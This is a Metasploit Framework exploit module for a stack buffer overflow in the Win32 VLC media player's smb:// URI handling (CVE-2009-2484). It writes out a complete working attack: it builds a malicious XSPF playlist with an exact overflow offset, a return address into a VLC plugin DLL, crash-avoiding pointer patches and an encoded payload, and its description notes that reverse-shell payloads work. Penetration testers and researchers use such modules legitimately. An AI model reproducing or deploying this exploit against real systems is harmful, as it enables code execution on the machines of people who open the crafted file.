##
# $Id: vlc_smb_uri.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'VideoLAN Client (VLC) Win32 smb:// URI Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in the Win32AddConnection
				function of the VideoLAN VLC media player. Versions 0.9.9 throught 1.0.1 are
				reportedly affected.

				This vulnerability is only present in Win32 builds of VLC.

				This payload was found to work with the windows/exec and
				windows/meterpreter/reverse_tcp payloads. However, the
				windows/meterpreter/reverse_ord_tcp was found not to work.
			},
			'License'        => MSF_LICENSE,
			'Author' 	     => [ 'jduck' ],
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					[ 'BID', '35500' ],
					[ 'OSVDB', '55509' ],
					[ 'CVE', '2009-2484' ],
					[ 'URL', 'http://git.videolan.org/?p=vlc.git;a=commit;h=e60a9038b13b5eb805a76755efc5c6d5e080180f' ],
					[ 'URL', 'http://milw0rm.com/exploits/9209' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/9029' ]
				],
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00",
					'DisableNops'    => true,
					'EncoderType'    => Msf::Encoder::Type::AlphanumMixed,
					'EncoderOptions' =>
						{
							'BufferRegister' => 'ESI',
						}
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'vlc 0.9.9 on Windows XP SP3',
						# shellcode pointers @ esp + {0xa4,0xd0,0xdc,0xec,0x1ec}
						{
							'Readable' => 0x65414141, # points to nul bytes in libmod_plugin
							'Offset'   => 409,
							# libvout_directx_plugin.dll
							# add esp,0xcc / pop ebx / pop esi / pop edi / pop ebp / ret
							# esi is used as our buffer register, and also becomes eip
							# (there are two copies of the pointer on the stack)
							'Ret'      => 0x6b54543e,
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Jun 24 2009',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.xspf']),
			], self.class)
	end

	def exploit

		template = %Q|<?xml version="1.0" encoding="UTF-8"?>
<playlist version="1" xmlns="http://xspf.org/ns/0/" xmlns:vlc="http://www.videolan.org/vlc/playlist/ns/0/">
<title>Playlist</title>
<trackList>
<track>
<location>REPLACE_ME</location>
<extension application="http://www.videolan.org/vlc/playlist/0">
<vlc:id>0</vlc:id>
</extension>
</track>
</trackList>
</playlist>
|

		readable = [target['Readable']].pack('V')

		# we'll model the memory layout post-overflow..
		#psz_remote = Rex::Text.pattern_create(2+260+1+260)
		psz_remote = rand_text_alphanumeric(target['Offset'] + 4)
		psz_remote[0,2] = "\\\\"
		psz_remote[2+260,1] = "\\"

		# some of this causes crashes in "WNetAddConnection2A" so we need to use
		# readable addresses... dodging the crashy derefs!
		# NOTE: some of these only occur in odd open scenarios (like drag/drop)
		psz_remote[263,4] = readable
		psz_remote[271,4] = readable
		psz_remote[325,4] = readable
		psz_remote[337,4] = readable

		# add the return addr in
		psz_remote[target['Offset'],4] = [target.ret].pack('V')

		# now we can split it and put it in the xml...
		host,share = psz_remote[2,psz_remote.length].split("\\")
		path = "smb://%s@%s/%s/" % [payload.encoded, host, share]
		sploit = template.gsub(/REPLACE_ME/, path)

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(sploit)

	end

end
